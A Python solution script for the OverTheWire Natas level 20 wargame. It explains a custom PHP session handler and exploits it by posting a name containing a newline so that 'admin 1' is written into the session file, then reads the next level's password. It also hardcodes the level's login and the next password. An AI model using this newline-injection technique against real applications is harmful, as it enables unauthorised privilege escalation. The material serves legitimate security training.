import requests
import bs4
import re


# configuration for natas20
USERNAME = 'natas20'
PASSWORD = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
URL = 'http://natas20.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)


# firstly, the following code tells us that 
# once we made the post request, it will take
# the name value that we provided and assign the value to 
# $_SESSION["name"]
"""
if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}
"""
# there are 2 important functions in the source code
# which are myread() and mywrite().
# myread() will be executed when session_start() is called
# reference: https://www.php.net/manual/en/function.session-set-save-handler.php
# in the source code, session_start() is called before the above code
# then, mywrite() will be executed when the session needs to be saved
# which is when the request has been processed and the webpage returned back to the client.
# NOTE: the $sid used as the argument to both myread() and mywrite() is obtained from PHPSESSID cookie
"""
if(!file_exists($filename)) {
    debug("Session file doesn't exist");
    return "";
} 
"""
# first call to myread() will simply return "" as the file name has not been written by mywrite().
"""
foreach($_SESSION as $key => $value) {
    debug("$key => $value");
    $data .= "$key $value\n";
}
file_put_contents($filename, $data); 
"""
# mywrite() then write the key and value of current $_SESSION into the file.
# in the subsequent call to myread(), which is at the next request,
"""
$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
} 
"""
# it will read the content of the file, which consisted of $key and $value of $_SESSION
# and set them as the content of the new $_SESSION array.
# our goal is to make mywrite() writes "admin 1" to the file and myread() assigns '1' to $_SESSION["admin"]


# one attack that we can perform is to set the name to contain a newline
# for example, randomusername\nadmin 1.
# therefore, mywrite() will write it as follows
"""
name randomusername\nadmin 1
"""
# since myread() will split the content of the file based on a newline,
# the file will be read as follows
"""
name randomusername
admin 1
"""
# and thus, it should give us the admin page
data = {
    'name' : 'randomusername\nadmin 1',
    'submit' : 'submit'
}
# to activate the debug functionality, we need to use the debug parameter
response = session.post(URL + 'index.php?debug', data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# one request to the server won't be enough as:
# 1. myread() is executed before mywrite()
# the above post request will only write the file but won't assign '1' to $_SESSION['admin']
# therefore, we need one more request for myread() to properly read the written file
# 2. the PHPSESSID cookie must be the same for the subsequent call
# otherwise, myread() will read from another file instead of the existing one
# we can simply make a get request to the server to trigger myread()
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# natas21 password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
password = re.search(r'Password: (\w+)', response.text)[1]
print(f'natas21 password: {password}')